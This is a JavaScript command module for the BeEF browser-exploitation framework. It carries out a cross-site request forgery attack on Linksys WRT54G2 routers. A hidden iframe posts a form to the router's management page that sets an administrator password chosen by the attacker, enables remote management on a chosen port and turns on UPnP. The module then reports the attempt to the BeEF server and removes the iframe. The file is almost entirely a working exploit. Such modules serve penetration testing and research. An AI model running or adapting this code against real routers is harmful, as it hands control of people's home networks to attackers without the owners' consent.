//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var wrt54g2_iframe = beef.dom.createIframeXsrfForm(gateway + "Manage.tri", "POST",
      [{'type':'hidden', 'name':'MANAGE_USE_HTTP', 'value':'0'} ,
       {'type':'hidden', 'name':'MANAGE_HTTP', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_HTTP_S', 'value':'0'},
       {'type':'hidden', 'name':'MANAGE_PASSWORDMOD', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_PASSWORD', 'value':passwd},
       {'type':'hidden', 'name':'MANAGE_PASSWORD_CONFIRM', 'value':passwd},
       {'type':'hidden', 'name':'_http_enable', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_WLFILTER', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_REMOTE', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_PORT', 'value':port},
       {'type':'hidden', 'name':'MANAGE_UPNP', 'value':'1'},
       {'type':'hidden', 'name':'layout', 'value':'en'}
      ]);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(wrt54g2_iframe);
  }
  setTimeout("cleanup()", 15000);

});

